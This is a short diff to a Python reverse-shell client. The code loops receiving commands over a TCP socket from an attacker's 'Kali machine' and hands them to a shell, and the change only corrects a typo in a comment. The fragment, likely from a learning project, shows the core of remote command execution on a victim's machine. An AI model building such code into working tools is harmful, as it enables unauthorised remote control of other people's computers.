@@ -8,7 +8,7 @@ def connect():
     while True:
         command = s.recv(1024) # keep receiving commands from the Kali machine, read the first KB of the tcp socket
 
-        if 'terminate' in command.decode(): # if we got termiante order from the attacker, close the socket and break the loop
+        if 'terminate' in command.decode(): # if we got terminate order from the attacker, close the socket and break the loop
             s.close()
             break
         else:   # otherwise, we pass the received command to a shell process
